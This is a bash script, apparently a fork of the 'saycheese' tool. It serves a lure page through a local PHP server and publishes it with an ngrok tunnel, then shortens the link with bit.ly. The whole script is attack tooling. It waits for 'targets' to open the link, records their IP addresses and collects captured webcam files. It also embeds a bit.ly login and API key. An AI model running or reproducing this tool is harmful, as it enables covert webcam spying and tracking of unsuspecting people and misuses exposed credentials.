#!/bin/bash
# coded by: github.com/thelinuxchoice/saycheese
# This script modified by Mrcakil
# fixed ngrok error and remove serveo server by Mrcakil
# thanks for linuxchoice

trap 'printf "\n";stop' 2

stop() {
    checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
    checkphp=$(ps aux | grep -o "php" | head -n1)
    checkssh=$(ps aux | grep -o "ssh" | head -n1)
    if [[ $checkngrok == *'ngrok'* ]]; then
        pkill -f -2 ngrok > /dev/null 2>&1
        killall -2 ngrok > /dev/null 2>&1
    fi

    if [[ $checkphp == *'php'* ]]; then
        killall -2 php > /dev/null 2>&1
    fi
    if [[ $checkssh == *'ssh'* ]]; then
        killall -2 ssh > /dev/null 2>&1
    fi
    exit 1

}

dependencies() {


    command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }



}

catch_ip() {

    ip=$(grep -a 'IP:' modules/grabcam/ip.txt | cut -d " " -f2 | tr -d '\r')
    IFS=$'\n'
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

    cat modules/grabcam/ip.txt >> modules/grabcam/saved.ip.txt


}

checkfound() {

    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
    while [ true ]; do


        if [[ -e "modules/grabcam/ip.txt" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
            catch_ip
            rm -rf modules/grabcam/ip.txt

        fi

        sleep 0.5

        if [[ -e "modules/grabcam/Log.log" ]]; then
            printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
            rm -rf modules/grabcam/Log.log
        fi
        sleep 0.5

    done 

}





payload_ngrok() {

    link=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
    hostnya="https://$link"
    sed 's+forwarding_link+'$hostnya'+g' modules/grabcam/grabcam.html > modules/grabcam/index2.html
    sed 's+forwarding_link+'$hostnya'+g' modules/grabcam/template.php > modules/grabcam/index.php


}

ngrok_server() {
    akun="o_1o6ig4t6q1"
    key="R_e656535d4eff4c39bb0f099192742e80"
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:80 -t modules/grabcam > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ngrok http 80 > /dev/null 2>&1 &
    sleep 10

    link=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
    printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m  https://$link \n"
    cakill="https://$link"
    shortlink=$(curl "http://api.bit.ly/v3/shorten?login=$akun&apiKey=$key&longURL=$cakill&format=txt" 2> /dev/null)
    printf "\e[1;92m[\e[0m*\e[1;92m] Or Shortlink1 :\e[0m\e[1;77m  $shortlink"
    payload_ngrok
    checkfound
}



dependencies
ngrok_server
